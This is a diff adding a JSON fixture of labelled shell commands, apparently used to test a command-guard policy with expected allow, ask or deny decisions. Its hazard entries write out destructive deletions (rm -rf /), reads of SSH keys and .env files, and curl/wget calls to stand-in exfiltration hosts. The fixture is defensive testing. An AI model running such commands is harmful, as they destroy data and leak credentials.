@@ -1,0 +1,22 @@
+[
+  {"name":"public dangerous deletion","label":"hazard","command":"rm -rf /","expected_decision":"deny","required_rule_ids":["CMD_DANGEROUS_DELETE"],"mandatory_category":"dangerous_delete"},
+  {"name":"PowerShell dangerous deletion","label":"hazard","command":"Remove-Item -Recurse -Force C:\\\\","expected_decision":"deny","required_rule_ids":["CMD_DANGEROUS_DELETE"],"mandatory_category":"dangerous_delete"},
+  {"name":"public SSH credential read","label":"hazard","command":"cat ~/.ssh/id_rsa","expected_decision":"deny","required_rule_ids":["PATH_SSH_CREDENTIAL"],"mandatory_category":"credential_read"},
+  {"name":"environment credential read","label":"hazard","command":"cat .env","expected_decision":"deny","required_rule_ids":["PATH_ENV_FILE"],"mandatory_category":"credential_read"},
+  {"name":"public non-allowlisted network","label":"hazard","command":"curl https://evil.example/file","expected_decision":"deny","required_rule_ids":["NETWORK_DOMAIN_DENIED"],"mandatory_category":"non_allowlisted_network"},
+  {"name":"wget non-allowlisted network","label":"hazard","command":"wget https://exfil.example/data","expected_decision":"deny","required_rule_ids":["NETWORK_DOMAIN_DENIED"],"mandatory_category":"non_allowlisted_network"},
+  {"name":"shell wrapper","label":"hazard","command":"bash -c 'echo safe'","expected_decision":"deny","required_rule_ids":["CMD_SHELL_WRAPPER"]},
+  {"name":"dependency install","label":"hazard","command":"go install example.com/tool@latest","expected_decision":"ask","required_rule_ids":["DEPENDENCY_GO_INSTALL"]},
+  {"name":"long sleep","label":"hazard","command":"sleep 120","expected_decision":"deny","required_rule_ids":["RESOURCE_LONG_SLEEP"]},
+  {"name":"unbounded output","label":"hazard","command":"yes","expected_decision":"deny","required_rule_ids":["RESOURCE_UNBOUNDED_OUTPUT"]},
+  {"name":"safe go test","label":"safe","command":"go test ./...","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe go env","label":"safe","command":"go env","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe project read","label":"safe","command":"cat README.md","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe ordinary argument","label":"safe","command":"go test -run TestGuard","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe quoted redirect symbol","label":"safe","command":"echo '>'","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe URL text","label":"safe","command":"echo https://evil.example","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe allowlisted network","label":"safe","command":"curl https://api.github.com/repos/x/y","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe quoted delete text","label":"safe","command":"echo 'rm -rf /'","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe go version","label":"safe","command":"go version","expected_decision":"allow","required_rule_ids":[]},
+  {"name":"safe docs read","label":"safe","command":"cat docs/README.md","expected_decision":"allow","required_rule_ids":[]}
+]
